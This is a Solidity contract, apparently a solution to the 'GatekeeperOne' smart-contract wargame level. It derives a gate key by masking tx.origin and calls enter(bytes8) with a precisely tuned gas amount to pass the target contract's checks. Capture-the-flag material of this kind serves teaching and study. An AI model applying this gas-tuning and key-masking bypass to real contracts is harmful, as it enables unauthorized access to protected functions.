import "./GatekeeperOne.sol";

pragma solidity ^0.4.18;

contract AttackGates {
    address public _gateKey = tx.origin;
    bytes8 public _gateKey8 = bytes8(_gateKey);
    bytes8 public mask = 0xFFFFFFFF0000FFFF;

    bytes8 public _gateKey8Padded = _gateKey8 & mask;

    GatekeeperOne gate = GatekeeperOne(0x178b711efd00c21bd04862ed0f31d6421c0930bd);

    function hack() public {
        if (!gate.call.gas(32979)(bytes4(keccak256("enter(bytes8)")), _gateKey8Padded)) {
            revert();
        }
    }
}